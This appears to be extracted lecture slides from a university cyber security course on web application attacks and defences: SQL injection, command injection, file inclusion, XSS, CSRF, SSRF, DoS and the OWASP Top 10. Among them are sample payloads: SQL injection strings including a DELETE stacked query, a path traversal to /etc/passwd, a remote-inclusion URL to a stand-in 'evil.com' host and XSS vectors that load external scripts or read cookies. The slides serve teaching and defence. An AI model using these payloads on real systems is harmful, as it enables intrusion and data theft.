- Data from all potentially untrusted sources should be subject to
    input validation
- Input validation is applied on both syntactical and Semantic level.
    **Syntactic validation** enforces correct syntax of structured
    fields(date, email id etc). **Semantic validation** enforces correctness
    of the values in the specific business context (max and min range)


### BurpSuite

- The Burp Suite is an assortment of devices used to perform
    pen-testing and security inspecting.
- The Burp Suite can act as an interrupting proxy and also
    captures traffic between an internet browser and a web server.




### SQLMAP

- Sqlmap is an open source penetration testing tool that automates
    the process of detecting and exploiting SQL injection flaws and
    taking over of database servers.
- Features of SQLMAP
    - Full support for most of the popular databases
    - Full support for all SQL injection techniques
    - Support to directly connect to the database and enumerate users, password
       hashes, privileges, roles, databases
    - Automatic recognition of password hash format
    - Support to search for specific database names, specific tables across all
       databases or specific columns across all databases' tables.
    - Support to execute arbitrary commands and retrieve their standard output


### SQLMAP: Installation and Execution


### SQLMAP: Features

- Identify the vulnerable parameters
- Identify which SQL injection techniques can be used to exploit
    the vulnerable parameter(s)
- Fingerprint the back-end database management system


### Techniques in SQL Injection

- There are 3 types of SQL Injection Methods
- In-band SQLi: The attacker uses the same channel of
    communication to launch their attacks and to gather their results.
       - Error-based
       - UNION query-based
- Inferential (Blind) SQLi: The attacker sends data payloads to the
    server and observes the response and behavior of the server to
    learn more about its structure.
       - Boolean-based blind
       - Time-based blind
- Stacked queries or piggy backing


### Techniques in SQL Injection: Boolean-based

### blind

- Boolean-based SQL Injection is an inferential SQL Injection
    technique that relies on sending an SQL query to the database
    which forces the application to return a different result
    depending on whether the query returns a TRUE or FALSE
    result.
       - https://test1.com/status?empID=29
       - https://test1.com/status?empID=29’AND+1=2--
       - [http://test1.com/status?empID=29](http://test1.com/status?empID=29) ' AND (length(database())) = 1 --+


### Techniques in SQL Injection: Time-based blind

- Time-based SQL Injection is an inferential SQL Injection
    technique that relies on sending an SQL query to the database
    which forces the database to wait for a specified amount of
    time (in seconds) before responding.
- We inject a conditional time delay (using sleep or benchmark()
    functions) in the query to ask a yes/no question to the
    database. If the condition is verified the time delay will be
    executed and the server response will be abnormally long.
    This will allow the attacker to know if the condition was true or
    false
       - SELECT * FROM products WHERE id=1-IF(MID(VERSION(),1,1) = '5',
          SLEEP(15), 0)


### Techniques in SQL Injection: Union Basesd

- In a UNION-based SQL, the attacker uses the UNION SQL
    operator to combine the results of two or more SELECT
    statements into a single result so that the attacker is able to add
    their own commands to the commands run by the web
    application.
       Select name, id from customers
       Union
       Select name,password from users
- **To determine the number of Columns:**
- SELECT name, description, price FROM products WHERE category=1 ORDER BY 2
- Or passing Null in select statements with Union
- SELECT name, description, price FROM products WHERE category=1 ' UNION
SELECT NULL—
- **To determine the datatype** : 'UNION SELECT **'a',** NULL,NULL,NULL--


### Techniques in SQL Injection: Error Based

- Error-based SQLi: It is an in-band SQL Injection technique that
    relies on error messages thrown by the database server to
    obtain information about the structure of the database.
       - https://test.com/test1.php?id=6’
- While errors are very useful during the development phase of
    a web application, they should be disabled on a live site, or
    logged to a file with restricted access to prevent such attacks


### Techniques in SQL Injection: Stacked Queries

- In Stacked Queries we concatenate multiple SQL commands
    using ‘;’. In SQL, a semicolon indicates that the end of a
    statement. This allows executing multiple statements in the
    same call to the database server.
       - SELECT * FROM products WHERE productid=1; DELETE FROM
          products
       - Contrary to UNION attacks which are limited to SELECT statements,
          stacked queries can be used to execute any SQL statement or
          procedure.


### SQLMAP

- Sqlmap is an open source penetration testing tool that
    automates the process of detecting and exploiting SQL
    injection flaws and taking over of database servers.


### SQLMAP: Features

- Identify the vulnerable parameters
- Identify which SQL injection techniques can be used to exploit
    the vulnerable parameter(s)
- Fingerprint the back-end database management system


## ` OS command

## injection

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Command Separators

- Command Separators for Linux and Windows
    - &,&&,|,||
- Command Separators for Linux
    - ;,\n
    - ‘injected command’, $(injected command)


`

## File inclusion

## vulnerability

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### File Upload Vulnerability

- File upload functions allow users to upload a file to the web
    server's file system.
- File upload functions may have certain restrictions
- File upload vulnerabilities arise when users or attackers are
    able to bypass this restrictions


### File Upload Vulnerability Demo


### File Upload Vulnerability Demo


### Burp Repeater

- Burp Repeater is a tool that enables a user to modify and send
    a HTTP message again and again
- Repeater enables you to work on multiple messages
    simultaneously, each in its own tab.


### Uses of Repeater

- Repeater can:
    - Send a request with varying parameter values to test for input-based
       vulnerabilities.
    - Send a series of HTTP requests in a specific sequence to test for
       vulnerabilities in multi-step processes, or vulnerabilities that rely on
       manipulating the connection state.
    - Manually verify issues reported by Burp Scanner.


### Burp Repeater Demo


### File inclusion vulnerability

- File inclusion vulnerabilities arises when a web server allows
    unrestricted upload of files to its filesystem without proper
    validation of parameters like name, type, contents, or size.
- File Inclusion vulnerabilities allow an attacker to read and
    sometimes execute files on the victim server.
- In the worst case, an attacker can obtain full control over the
    shell by uploading a server side code that functions as a web
    shell.


### Types of file inclusion vulnerabilities

- Depending on the origin of the included file inclusion
    vulnerabilities are divided into
- Local File Inclusion (LFI): It is the process of including files, that
    are already locally present on the server, through the
    exploiting of vulnerable inclusion procedures implemented in
    the application.
- Remote File Inclusion (RFI): It is a web vulnerability that lets a
    malicious hacker force the application to include arbitrary
    code files imported from another location, for example, a
    server controlled by the attacker.


### Methods to Inject File upload Vulnerabilities

- Flawed validation of file uploads
- Flawed validation of the file's contents
- Insufficient blacklisting of dangerous file types
- Obfuscating file extensions
- Uploading malicious client-side scripts
- Exploiting vulnerabilities in the parsing of uploaded files
- Exploiting file upload race conditions
- Uploading files using PUT


### Local File Inclusion (LFI): Example

- Sample url
- https://test.com/?file=file1.php
- Changed url
- https://test.com/?file=../../../etc/passwd


### Null Byte Injection

- The null character (also known as null terminator or null byte)
    is a control character with the value zero present in many
    character sets that is being used as a reserved character to
    mark the end of a string.
- Null byte is a bypass technique for sending data that would be
    filtered otherwise
- It relies on injecting the null byte characters (%00, \x00) in the
    supplied data.


### Null Byte Injection Demo


### Path and Dot Truncation

- It is used mostly with web applications that work on PHP
- Most PHP installations have a filename limit of 4096 bytes. If
    any given filename is longer than that length, PHP simply
    truncates it, discarding any additional characters.
- This behavior can be used to ignore the file extensions by
    making the file name moving out of the 4096 bytes limit as no
    error is triggered.
- PHP ignores the additional characters and continues the
    execution.


### Directory Traversal

- Directory traversal (also known as file path traversal) is a web
    security vulnerability that allows an attacker to read arbitrary
    files on the server that is running an application.


### File Inclusion Vulnerabilities in DVWA


### Remote File Inclusion

- Remote File Inclusion (RFI) occurs when the web application
    references an external file and executes it.
- These remote files are usually obtained in the form of an
    HTTP or FTP URI as a user-supplied parameter to the web
    application.


### Remote File Inclusion

$file=$_GET['file']

include($file);

[http://www.test.com/index.php?file=www.evil.com/mal.php](http://www.test.com/index.php?file=www.evil.com/mal.php)


### Remediation

- Proper input validation and sanitization
- Regularly scan applications for potential vulnerabilities.
- Blacklist approach: identifying and blocking publicly
    known attackers and malicious URLs, as well as those
    that have already tried to infiltrate your site or server.
- Whitelist approach: Creating a source of valid and
    acceptable file types and text
- Enable code reviewing for identifying vulnerabilities in
    the code


`

## XSS

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Cross Site Scripting

- Cross-site Scripting (XSS) is a client-side code injection attack.
- The aim of the attack is to execute malicious scripts in a web
    browser of the victim by including malicious code in a web
    application.
- The injection points for cross site scripting attacks are input
    fields like comment boxes, forums, message boards etc


- A web page or web application is vulnerable to XSS if it uses
    unsanitized user input in the output that it generates.
- It allows an attacker to circumvent the same origin policy,
    which is designed to segregate different websites from each
    other.
- It also allows the attacker to gain full control over all of the
    application's functionality and data.


### Types of XSS

- There are three main types of XSS attacks.
    - **Reflected XSS :** where the malicious script comes from the current
       HTTP request.
    - **Stored XSS:** where the malicious script comes from the website's
       database.
    - **DOM-based XSS:** where the vulnerability exists in client-side code
       rather than server-side code.


### Reflected XSS

- Reflected cross-site scripting arises when a web application
    includes data from an HTTP request in the response in an
    unsafe way.
- The attacker with XSS can imitate an authenticated user of
    web application and will be able to modify or view any
    functionality as the user can perform
- The location of the reflected data within the application's
    response affect the impact of the vulnerability.


### Reflected XSS


### Document Object Model (DOM)

- The Document Object Model (DOM) is the data
    representation of the objects that comprise the structure and
    content of a document on the web.
- It is a programming interface for web documents.
    - It represents the page so that programs can change the document
       structure, style, and content.
    - The DOM represents the document as nodes and objects; that way,
       programming languages can interact with the page.
- Document Object Model (DOM) representation allows a web
    page to be manipulated


### Document Object Model (DOM)

- The Document Object Model (DOM) connects web pages to
    scripts or programming languages by representing the
    structure of a document in memory
- It represents a document with a logical tree where each
    branch of the tree ends in a node, and each node contains
    objects.
- DOM methods allow programmatic access to the tree and
    with them document's structure, style, or content can be
    changed.


<html lang="en">
<head>
<script>
window.onload= () => {
constheading = document.createElement("h1");
constheadingText= document.createTextNode("Big Head!");
heading.appendChild(headingText);
document.body.appendChild(heading);
};
</script>
</head>
<body></body>
</html>


### DOM


### DOM Based XSS

- DOM Based or **type-0 XSS** is an XSS attack wherein the attack
    payload is executed as a result of modifying the DOM
    environment in the victim or client’s browser, so that the client
    side code runs in an unexpected manner.
- Thus in DOM based XSS the HTTP response of the page does
    not change, but the client side code contained in the page
    executes differently due to the malicious modifications that
    have occurred in the DOM environment.



### DOM Based XSS

**Sinks**

- document.write()
- document.writeln()
- document.domain
- element.innerHTML
- element.outerHTML

```
JqueryFunctions
```
- add()
- after()
- append()
- animate()
- insertAfter()
- html()


### Burp Intruder

- Burp Intruder is a powerful tool for performing highly
    customizable, automated attacks against websites. It enables
    to configure attacks by sending the same request over and
    over again, inserting different payloads into predefined
    positions each time
- Burp Intruder can:
    - Fuzz for input-based vulnerabilities.
    - Perform brute-force attacks.
    - Enumerate valid identifiers and other inputs.
    - Harvest useful data.



### Stored XSS

- Stored XSS or **Persistent XSS** occurs when a web application
    gathers input from a user which might be malicious, and then
    stores that input in a data store for later use.
- The input that is stored is not sanitized and as such the
    malicious data becomes part of the web site and run in the
    client with privileges of the web application
- As this vulnerability involves at least two requests to the
    application, this is also called **second-order XSS**


### Stored XSS Demo


### Testing and Prevention of XSS Attacks

- Black Box testing
    - Detect input vectors
    - Analyse input vectors
    - Check Impact: tester identifies any special characters that were not
       properly encoded, replaced, or filtered out. The set of vulnerable
       unfiltered special characters will depend on the context of that
       section of HTML.
          - The key HTML entities to identify are: >,<, &, ‘, "
          - Within the context of Javascriptanother set \n, \r\(backs\n (new line), \\uXXXX
             (unicodevalues)lash), \uXXXXetc
- Gray Box Testing: The pen-tester has partial knowledge of the
    application like user input, input validation controls etc


### Testing and Prevention of XSS Attacks

- Basic XSS Test Without Filter Evasion
    - <SCRIPT SRC=http://test.com/attack.js></SCRIPT>
- Malformed A Tags:
    - \<a onmouseover="alert(document.cookie)"\>xxslink\</a\>
- Malformed IMG Tags
    - <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>


`

## XSS cookie stealing

## and demos

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Cookies

- An HTTP cookie (web cookie, browser cookie) is a small piece
    of data that a server sends to a user's web browser.
- The browser stores the cookie and send it back to the same
    server with later requests.
- It remembers stateful information for the stateless HTTP
    protocol.


### Cookie Stealing with XSS


### HttpOnly Cookies

- HttpOnlycookies are a defense mechanism supported by some
    browsers and employed by some applications in an attempt to
    prevent cookie stealing attack payload from succeeding
- When an application sets a cookie, it can be flagged as HttpOnly in
    the Set-Cookie header:
       - Set-Cookie: SessId=12d1a1f856ef224ab424c2454208ff; HttpOnly;
- When a cookie is flagged in this way, supporting browsers will
    prevent client-side JavaScript from directly accessing the cookie.
- Although the browser will still submit the cookie in the HTTP
    headers of requests, it will not be included in the string returned by
    document.cookie.


### Cross-site tracing (or XST)

- It is an enable client-side that enables JavaScript to gain
    access to the values of cookies flagged as HttpOnly
- It uses the HTTP TRACE method, which is designed for
    diagnostic purposes and is enabled on many web servers by
    default.
- Browsers submit all cookies in HTTP requests, including
    requests that use the TRACE method, and including cookies
    flagged as HttpOnly.
- If client-side JavaScript can be used to issue a TRACE request,
    and read the response to that request, then the script will be
    able to access cookies that are flagged as HttpOnly


### Explioting XSS to capture Passwords

- A stored XSS vulnerability can be exploited to capture
    passwords
- If the victim has saved credentials saved in their browser, then
    a JavaScript function can be used to grab the credentials and
    send them back to the attacker



### Reflected XSS Medium Security Code

<?php

header ("X-XSS-Protection: 0");

// Is there any input?

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

```
// Get input
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
// Feedback for end user
$html .= "<pre>Hello ${name}</pre>";
```
}

?>


### Reflected XSS High Security Code

<?php

header ("X-XSS-Protection: 0");

// Is there any input?

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

// Get input
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[
'name' ] );

```
// Feedback for end user
$html .= "<pre>Hello ${name}</pre>";
```
}

?>



### Reflected XSS in DVWA


### Stored XSS in DVWA


### DOM based XSS in DVWA


### Reflected XSS Medium Security Code

<?php

header ("X-XSS-Protection: 0");

// Is there any input?

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

```
// Get input
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
// Feedback for end user
$html .= "<pre>Hello ${name}</pre>";
```
}

?>


### Reflected XSS High Security Code

<?php

header ("X-XSS-Protection: 0");

// Is there any input?

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

// Get input
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[
'name' ] );

```
// Feedback for end user
$html .= "<pre>Hello ${name}</pre>";
```
}

?>


### Input Sanitization in DVWA

- **strip_tags():** It removes all html tags from the message field
    before storing them in database
- **str_replace():** This function replaces all the occurrences of a
    string with null or blank character
- **preg_replace():** This function is an inbuilt function in PHP
    which is used to perform a regular expression for search and
    replace the content.


### Stored XSS

- Stored XSS or **Persistent XSS** occurs when a web application
    gathers input from a user which might be malicious, and then
    stores that input in a data store for later use.
- The input that is stored is not sanitized and as such the
    malicious data becomes part of the web site and run in the
    client with privileges of the web application
- As this vulnerability involves at least two requests to the
    application, this is also called **second-order XSS**


### Stored XSS Demo


`

## CSRF

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Cross-Site Request Forgery (CSRF)

- According to OWASP, Cross-Site Request Forgery (CSRF) is an
    attack that forces an end user to execute unwanted actions on
    a web application in which they’re currently authenticated.
- An attacker can trick the users of a web application into
    executing actions of the attacker’s choosing.
       - For example, if the victim is a normal user, a successful CSRF attack
          can force the user to perform state changing requests like
          transferring funds, changing their email address, and so forth.
       - If the victim is an administrative account, CSRF can compromise the
          entire web application.


### How the attack is performed

- In CSRF attacks, the attacker inherits the identity and
    privileges of the victim to perform an undesired function on
    the victim’s behalf
- In most browsers browser requests include any credentials
    associated with the site, such as the user’s session cookie, IP
    address etc
- Once an user is authenticated to the site, the site will have no
    way to distinguish between the forged request sent by the
    attacker and a legitimate request sent by the victim.


### The Attack Scenario

```
Image Ref: Cross-Site Request Forgeries: Exploitation and Prevention by William
Zeller and Edward W. Felten
```

### The Attack Scenario

```
Image Ref: Cross-Site Request Forgeries: Exploitation and Prevention by
William Zeller and Edward W. Felten
```

### The Attack Scenario

Image Ref: Cross-Site Request Forgeries: Exploitation and Prevention by
William Zeller and Edward W. Felten


### CSRF and Same Origin Policy

- Same origin policy prevents scripts running under one origin
    to read data from another origin.
- CSRF allows an attacker to partly circumvent the same origin
    policy, which is designed to prevent different websites from
    interfering with each other.
- Same origin policy does not prevent requests from being sent,
    it only prevents an attack from reading the data returned from
    the third-party server.
- Since CSRF attacks are the result of the requests sent, the
    same-origin policy does not protect against CSRF attacks.


### CSRF Example with GET Method


### CSRF Example with POST Method


### CSRF Demo with Portswigger


### CSRF Token

- A CSRF token is a secure random token (e.g., synchronizer
    token or challenge token) that is used to prevent CSRF attacks.
       - The token needs to be unique per user session
       - It is generated large random value to make it difficult to guess.
- CSRF tokens is generated on the server-side. They can be
    generated once per user session or for each request.
       - Per-request tokens are more secure than per-session tokens as the
          time range for an attacker to exploit the stolen tokens is minimal.
- The CSRF token is transmitted to the client as part of a
    response payload, such as a HTML. It is then transmitted back
    to the server as a hidden field on a form submission.


### CSRF Token

- When a request is issued by the client, the server-side
    component must verify the existence and validity of the token
    in the request compared to the token found in the user
    session.
       - If the token was not found within the request, or the value provided
          does not match the value within the user session, then the request
          should be rejected
- CSRF tokens prevent CSRF because without a token, an
    attacker cannot create valid requests to the backend server.



### Same Site Cookie Attribute

- SameSite is a cookie attribute which aims to mitigate CSRF
    attacks.
- This attribute helps the browser decide whether to send
    cookies along with cross-site requests. Possible values for this
    attribute are **Lax, Strict, or None**.
- The **Strict value** will prevent the cookie from being sent by
    the browser to the target site in all cross-site browsing context,
    even when following a regular link


### Same Site Cookie Attribute

- The default **Lax** value provides a reasonable balance between
    security and usability for websites.
       - When you set a cookie’s SameSite attribute to Lax, the cookie will be
          sent along with the GET request initiated by third party website.
       - To send a cookie with a GET request, GET request being made must
          cause a top level navigation.
       - Resources can be loaded by iframe, img tags, and script tags. These
          requests can also operate as GET requests, but none of them cause
          TOP LEVEL navigation.
- If a cookie is set with the **None** attribute, this effectively
    disables SameSite restrictions altogether, regardless of the
    browser.


### Same Site Cookie Attribute Demo


`

## CSRF

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Cross-Site Request Forgery (CSRF)

- According to OWASP, Cross-Site Request Forgery (CSRF) is an
    attack that forces an end user to execute unwanted actions on
    a web application in which they’re currently authenticated.
- An attacker can trick the users of a web application into
    executing actions of the attacker’s choosing.
       - For example, if the victim is a normal user, a successful CSRF attack
          can force the user to perform state changing requests like
          transferring funds, changing their email address, and so forth.
       - If the victim is an administrative account, CSRF can compromise the
          entire web application.


### How the attack is performed

- In CSRF attacks, the attacker inherits the identity and
    privileges of the victim to perform an undesired function on
    the victim’s behalf
- In most browsers browser requests include any credentials
    associated with the site, such as the user’s session cookie, IP
    address etc
- Once an user is authenticated to the site, the site will have no
    way to distinguish between the forged request sent by the
    attacker and a legitimate request sent by the victim.


### The Attack Scenario

```
Image Ref: Cross-Site Request Forgeries: Exploitation and Prevention by William
Zeller and Edward W. Felten
```

### The Attack Scenario

```
Image Ref: Cross-Site Request Forgeries: Exploitation and Prevention by
William Zeller and Edward W. Felten
```

### The Attack Scenario

Image Ref: Cross-Site Request Forgeries: Exploitation and Prevention by
William Zeller and Edward W. Felten


### CSRF and Same Origin Policy

- Same origin policy prevents scripts running under one origin
    to read data from another origin.
- CSRF allows an attacker to partly circumvent the same origin
    policy, which is designed to prevent different websites from
    interfering with each other.
- Same origin policy does not prevent requests from being sent,
    it only prevents an attack from reading the data returned from
    the third-party server.
- Since CSRF attacks are the result of the requests sent, the
    same-origin policy does not protect against CSRF attacks.


### CSRF Example with GET Method


### CSRF Example with POST Method


### CSRF Demo with Portswigger


### CSRF Token

- A CSRF token is a secure random token (e.g., synchronizer
    token or challenge token) that is used to prevent CSRF attacks.
       - The token needs to be unique per user session
       - It is generated large random value to make it difficult to guess.
- CSRF tokens is generated on the server-side. They can be
    generated once per user session or for each request.
       - Per-request tokens are more secure than per-session tokens as the
          time range for an attacker to exploit the stolen tokens is minimal.
- The CSRF token is transmitted to the client as part of a
    response payload, such as a HTML. It is then transmitted back
    to the server as a hidden field on a form submission.


### CSRF Token

- When a request is issued by the client, the server-side
    component must verify the existence and validity of the token
    in the request compared to the token found in the user
    session.
       - If the token was not found within the request, or the value provided
          does not match the value within the user session, then the request
          should be rejected
- CSRF tokens prevent CSRF because without a token, an
    attacker cannot create valid requests to the backend server.



### Same Site Cookie Attribute

- SameSite is a cookie attribute which aims to mitigate CSRF
    attacks.
- This attribute helps the browser decide whether to send
    cookies along with cross-site requests. Possible values for this
    attribute are **Lax, Strict, or None**.
- The **Strict value** will prevent the cookie from being sent by
    the browser to the target site in all cross-site browsing context,
    even when following a regular link


### Same Site Cookie Attribute

- The default **Lax** value provides a reasonable balance between
    security and usability for websites.
       - When you set a cookie’s SameSite attribute to Lax, the cookie will be
          sent along with the GET request initiated by third party website.
       - To send a cookie with a GET request, GET request being made must
          cause a top level navigation.
       - Resources can be loaded by iframe, img tags, and script tags. These
          requests can also operate as GET requests, but none of them cause
          TOP LEVEL navigation.
- If a cookie is set with the **None** attribute, this effectively
    disables SameSite restrictions altogether, regardless of the
    browser.


### Same Site Cookie Attribute Demo


`

## CSRF (cont.) & Denial

## of Service attack

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### HTTP referer

- In HTTP, Referer is an optional HTTP header field that identifies
    the address of the web page from which the resource has
    been requested. By checking the referrer, the server providing
    the new web page can see where the request originated.
- This data can be used for analytics, logging, optimized
    caching, and more.
       - Referer: <url>
       - Referer: https://example.com/


### Referer Header


### HTTP Origin Header

- The Origin request header indicates the origin (scheme,
    hostname, and port) that caused the request.
       - Origin: <scheme>://<hostname>:<port>.
- Browsers or user agents add Origin request header in cross
    origin requests or same-origin requests except for GET or
    HEAD requests


### Origin Header


### CSRF Mitigation with Headers

- To mitigate CSRF with headers we determine where the
    origin request coming from via Origin or Referer headers and
    also determine where the origin the request is going to (target
    origin).
- At the server side if both the source and target origins match
    then accept the request as legitimate else discard the request.


### CSRF with Referer Validation


### Server Side Request Forgery

- Server-side request forgery (also known as SSRF) is a web
    security vulnerability that allows an attacker to induce the
    server-side application to make requests to an unintended
    location.
- The attacker can supply or modify a URL which the code
    running on the server will read or submit data to, and by
    carefully selecting the URLs, the attacker may be able to read
    server configuration, connect to internal services, or perform
    post requests towards internal services which are not intended
    to be exposed.


### How SSRF works

- The target application may have functionality for importing
    data from a URL, publishing data to a URL or otherwise
    reading data from a URL that can be tampered with.
- The attacker modifies the calls to this functionality by
    supplying a completely different URL or by manipulating how
    URLs are built
- When the manipulated request goes to the server, the server-
    side code picks up the manipulated URL and tries to read data
    to the manipulated URL.


### SSRF Demo


### Denial of Service

- DoS (Denial of Service) attack aims at preventing, for

```
legitimate users, authorized access to a system resource or the
delaying of system operations and functions
```
- The primary goal of the attack is to deny the victim(s) access to

```
a particular resource.
```
- Denial-of-service attacks significantly degrade the service

```
quality experienced by legitimate users. These attacks
introduce large response delays, excessive losses, and service
interruptions, resulting in direct impact on availability.
```

### Distributed Denial of Service

- When DoS attacks are launched via a large number of distributed

```
attacking hosts in the Internet these attacks are called distributed
denial of service (DDoS) attacks.
```
- DDoS attacks are carried out with networks of Internet-connected

```
machines.
```
- These networks consist of computers and other devices (such as
    IoT devices)which have been infected with malware, allowing
    them to be controlled remotely by an attacker.
- These individual devices arere referred to as bots (or zombies),
    and a group of bots is called a botnet.
- Once a botnet has been established, the attacker is able to direct
    an attack by sending remote instructions to each bot


### Attack Techniques

- Overload DoS attacks at the network layer: These DoS attacks

```
typically attempt to consume all available capacity on network
links, or to cause network hardware or software to fail due to
overload.
```
- Overload DoS attacks at the application layer: These DoS

```
attacks typically attempt to consume the compute resources of
the service by exercising compute-expensive functionality, or
by generating many more application sessions than the
service has been designed to cope with.
```

### Attack Techniques in DoS: TCP SYN Flooding

```
https://www.ionos.com/digitalguide/server/know-how/introduction-to-tcp/
```

### TCP SYN Flooding

```
Image Courtesy: https://www.imperva.com/learn/ddos/syn-flood/
```

### Attack Techniques in DoS: ICMP Smurf Flooding

- The Internet Control Message Protocol (ICMP), is an internet

```
layer protocol used by network devices to communicate.
```
- ICMP echo-request and echo-reply messages are used to

```
ping a network device for the purpose of diagnosing the
health and connectivity of the device and the connection
between the sender and the device.
```

### Attack Techniques in DoS: ICMP Smurf Flooding

```
Image Courtesy: https://www.cloudflare.com/learning/ddos/glossary/internet-control-message-protocol-icmp/
```

### Attack Techniques in DoS: UDP Flooding

- User Datagram Protocol (UDP) is a connectionless and sessionless

```
networking protocol and doesn’t require a three-way handshake
like TCP. It also runs with lower overhead than TCP.
```
- When a server receives a UDP packet at a particular port, it goes

```
through two steps in response:
```
- The server first checks to see if any programs are running which
    are presently listening for requests at the specified port.
- If no programs are receiving packets at that port, the server
    responds with a ICMP (ping) packet to inform the sender that
    the destination was unreachable.


### Attack Techniques in DoS: UDP Flooding

```
https://www.cloudflare.com/learning/ddos/udp-flood-ddos-attack/
```

### Attack Techniques in DoS: HTTP Flooding

- HTTP GET attack - in this form of attack, multiple computers or

```
other devices are coordinated to send multiple requests for
images, files, or some other asset from a targeted server.
```
- HTTP POST attack - This attack utilizes the disparity in relative

```
resource consumption, by sending many post requests
directly to a targeted server. The process of handling the form
data and running the necessary database commands is
relatively intensive compared to the amount of processing
power and bandwidth required to send the POST request
```

### Mitigating DoS and DDoS Attacks

- Traffic scrubbing: By using DDoS protection technologies that
    can act as intermediaries, so that system’s traffic goes through
    their network first. This lets them remove or “scrub” the bad
    traffic.
- Source or location blocking: This involves a source or location
    block, which involves adding the IP address to the ‘deny list’
    on the network device
- Pattern and behaviour blocking: This involves blocking traffic
    matching a specific pattern or behaviour. This method will be
    able to block common attack patterns.


### Mitigating DoS and DDoS Attacks

- Disabling dynamic functions: If the website loads a lot of
    dynamic content, from back end servers on each request,
    disabling these features will reduce the number of back end
    server calls which will enable the server handle more requests
    during the attack.
- Displaying CAPTCHA: For application layer DoS attacks
    CAPTCHA challenges can be used for any requests that may
    be bot traffic.


`

## OWASP Top 10

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### OWASP Top 10

- The OWASP Top 10 is put out by the Open Web Application

```
Security Project (OWASP) Foundation
```
- OWASP maintains and publicly shares the OWASP Top 10 , an

```
awareness document for web application security
vulnerabilities.
```
- Vulnerabilities are ranked based on a range of factors, which

```
include analysis of actual web application data submitted by
individuals and organizations.
```

### Broken Access Control

- Broken access control vulnerability is a type of security flaw

```
that allows an unauthorized user access to restricted
resources.
```
- Broken access control vulnerabilities are often caused by

```
weak authentication and authorization mechanisms, allowing
attackers to gain illegitimate privileges.
```

### Access Control

- Access control is the application of constraints on who (or

```
what) can perform attempted actions or access resources that
they have requested.
```
- Authentication is the security practice of confirming that

```
someone is who they claim to be, while authorization is the
process of determining which level of access each user is
granted.
```

### Types of Access Control:Vertical access control

```
Image courtesy: https://www.prplbx.com/resources/blog/broken-access-control/
```

### Types of Access Control:Horizontal access

### control

```
Image courtesy: https://www.prplbx.com/resources/blog/broken-access-control/
```

### Broken Access Control - Demo


`

## Insecure direct object

## references (IDOR)

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Insecure direct object references (IDOR)

- Insecure direct object references (IDOR) are a type of access

```
control vulnerability that arises when an application uses user-
supplied input to access objects directly.
```
- IDOR vulnerabilities are most commonly associated with

```
horizontal privilege escalation, but they can also arise in
relation to vertical privilege escalation
```

### Insecure direct object references (IDOR) - Demo


`

## Common Weakness

## Enumerations (CWEs)

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Common Weakness Enumerations (CWEs)

- CWE is a community-developed list of software and hardware
    weakness types. It serves as a common language, a
    measuring stick for security tools, and as a baseline for
    weakness identification, mitigation, and prevention efforts.


### Cryptographic Failures

- A cryptographic failure is a critical web application security

```
vulnerability that exposes sensitive application data on a weak
or non-existent cryptographic algorithm
```
- Cryptographic Failures result from:
    - Use of Hard-coded Password,
    - Broken or Risky Crypto Algorithm,
    - Insufficient Entropy.


### Mitigating Cryptographic Failures

- Classify data processed, stored, or transmitted by an application.
- Encrypt all sensitive data at rest
- Ensure up-to-date and strong standard algorithms, protocols,

```
and keys are in place
```
- Encrypt all data in transit with secure protocols
- Store passwords using strong adaptive and salted hashing

```
functions
```
- Ensure that cryptographic randomness is used where

```
appropriate
```

`

## Vulnerabilities: Injection

## and Insecure Design

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### A03:2021 – Injection

- An application is vulnerable to injection attacks when:
    - User-supplied data is not validated, filtered, or sanitized by
       the application.
    - Non-Dynamic queries or parameterized calls are used
       directly in the interpreter.
    - Hostile data is directly used or concatenated.
- Some of the more common injections are SQL, NoSQL, OS

```
command, Object Relational Mapping (ORM), LDAP, and
Expression Language (EL) or Object Graph Navigation Library
(OGNL) injection.
```

### Mitigating Injection Attacks

- Use a safe API
- Input validation.
- LIMIT and other SQL controls within queries to prevent mass
    disclosure of records


### A04:2021-Insecure Design

- Focuses on risks related to design and architectural flaws, with

```
a call for more use of threat modeling, secure design patterns,
and reference architectures.
```
- Insecure design is a broad category representing different

```
weaknesses
```
- Mitigation strategies include:
    - Unit and integration tests
    - Segregate tier layers on the system
    - Limit resource consumption


## ` Security misconfigurations

## & vulnerable and

## outdated components

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### A05:2021 – Security Misconfiguration

- An application is vulnerable if:
    - Missing appropriate security hardening across any part of the
       application stack or improperly configured permissions on cloud
       services.
    - Unnecessary features are enabled or installed (e.g., unnecessary
       ports, services, pages, accounts, or privileges).
    - Default accounts and their passwords are still enabled and
       unchanged.
    - Error handling reveals stack traces or other overly informative
       error messages to users.
    - For upgraded systems, the latest security features are disabled or
       not configured securely.


### Mitigating Security Misconfiguration

- Repeatable hardening process
- Review and update the configurations
- Segmented application architecture
- Security directives to clients
- Automated process to verify the effectiveness of the

```
configurations
```

### A06:2021– Vulnerable and Outdated components

- An application is vulnerable if:
    - Versions of all components both client-side and server-side are
       unknown
    - Software is vulnerable, unsupported, or out of date
    - Do not scan for vulnerabilities regularly
